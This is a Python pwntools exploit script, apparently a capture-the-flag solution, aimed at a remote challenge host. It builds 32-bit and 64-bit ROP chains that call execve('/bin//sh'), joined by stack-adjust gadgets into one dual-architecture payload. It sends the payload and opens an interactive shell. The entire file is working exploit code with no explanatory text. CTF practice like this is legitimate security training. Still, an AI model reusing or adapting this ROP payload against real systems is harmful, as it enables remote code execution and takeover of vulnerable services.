from struct import pack
from pwn import process,remote,p64

r = remote('node4.buuoj.cn', 29149)
# r = process('./pwn1')
# r = process('./pwn2')
# Padding goes here
rop64 = b''
rop64 += pack('<Q', 0x0000000000405895) # pop rsi ; ret
rop64 += pack('<Q', 0x00000000006a10e0) # @ .data
rop64 += pack('<Q', 0x000000000043b97c) # pop rax ; ret
rop64 += b'/bin//sh'
rop64 += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
rop64 += pack('<Q', 0x0000000000405895) # pop rsi ; ret
rop64 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
rop64 += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
rop64 += pack('<Q', 0x000000000046aea1) # mov qword ptr [rsi], rax ; ret
rop64 += pack('<Q', 0x00000000004005f6) # pop rdi ; ret
rop64 += pack('<Q', 0x00000000006a10e0) # @ .data
rop64 += pack('<Q', 0x0000000000405895) # pop rsi ; ret
rop64 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
rop64 += pack('<Q', 0x000000000043b9d5) # pop rdx ; ret
rop64 += pack('<Q', 0x00000000006a10e8) # @ .data + 8
rop64 += pack('<Q', 0x0000000000436ed0) # xor rax, rax ; ret
rop64 += pack('<Q', 0x000000000043b97c) # pop rax ; ret
rop64 += p64(0x3b)
rop64 += pack('<Q', 0x0000000000461645) # syscall ; ret
p_64 = rop64

p = b''

p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9060) # @ .data
p += pack('<I', 0x080a8af6) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9064) # @ .data + 4
p += pack('<I', 0x080a8af6) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9068) # @ .data + 8
p += pack('<I', 0x08056040) # xor eax, eax ; ret
p += pack('<I', 0x08056a85) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080481c9) # pop ebx ; ret
p += pack('<I', 0x080d9060) # @ .data
p += pack('<I', 0x0806e9f2) # pop ecx ; pop ebx ; ret
p += pack('<I', 0x080d9068) # @ .data + 8
p += pack('<I', 0x080d9060) # padding without overwrite ebx
p += pack('<I', 0x0806e9cb) # pop edx ; ret
p += pack('<I', 0x080d9068) # @ .data + 8
p += pack('<I', 0x08056040) # xor eax, eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x0807be5a) # inc eax ; ret
p += pack('<I', 0x080495a3) # int 0x80
p_32 = p


add_esp_0c_ret = 0x080a8f69 # add esp, 0xc; ret;
add_rsp_d8_ret = 0x00000000004079d4 # add rsp, 0xd8; ret;
payload = b'\00' * 0x110 + p64(add_esp_0c_ret) + p64(add_rsp_d8_ret) + p_32.ljust(0xd8, b'\00') + p_64

r.sendline(payload)
r.interactive()